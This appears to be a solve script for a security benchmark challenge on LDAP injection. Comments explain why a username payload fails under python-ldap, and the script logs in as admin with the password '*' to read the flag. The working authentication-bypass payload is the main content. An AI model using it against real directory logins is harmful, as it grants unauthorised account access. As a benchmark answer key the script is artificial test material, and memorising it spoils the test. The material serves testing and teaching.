#!/usr/bin/env bash
# APEX-018-25 — "LDAP Injection Authentication Bypass" (tags: ldap, injection)
#
# `authenticate` builds its search filter by concatenation:
#
#   (&(uid={username})(userPassword={password}))
#
# LDAP special characters are not escaped, and `*` in a filter is a presence
# test rather than a literal. A password of `*` turns the second clause into
# "this entry has a password at all", which every account satisfies, so the
# search returns the admin entry without anybody knowing the password.
#
# The better-known payload for this shape — a username of `admin)(&)` — is the
# one the benchmark's own notes suggest, and it does not work here: it leaves
# `)(userPassword=x))` dangling after a complete filter, and python-ldap
# refuses the whole thing with "Bad search filter" rather than ignoring the
# tail the way looser parsers do. Injecting through the password keeps the
# expression balanced, which is what this parser requires.
#
# The flag is the admin entry's `description`, which the login prints back.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex018-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST \
    --set path=/api/login \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set 'json.password=*' |
    flag
